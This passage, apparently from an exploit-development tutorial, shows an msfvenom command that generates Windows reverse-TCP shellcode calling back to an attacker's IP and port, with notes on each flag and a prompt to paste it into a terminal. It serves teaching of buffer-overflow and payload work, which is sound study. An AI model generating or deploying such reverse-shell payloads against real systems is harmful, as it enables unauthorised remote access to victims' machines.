Generating shellcode means we need a way in which our victim is going to connect back to us, We will be using **msfvenom** for this, to generate our payload, the command will be :

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.157 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"  
```

**LHOST:** the IP in which the target is gonna connect back to
**LPORT:** the port in which target will connect back to
**EXITFUNC:** Makes connection more stable
**-f:** for file type in this case C
**-a:** for architecture, could be x64 or x86
**-b:** for bad characters

- Paste this command into your terminal and you should get a payload

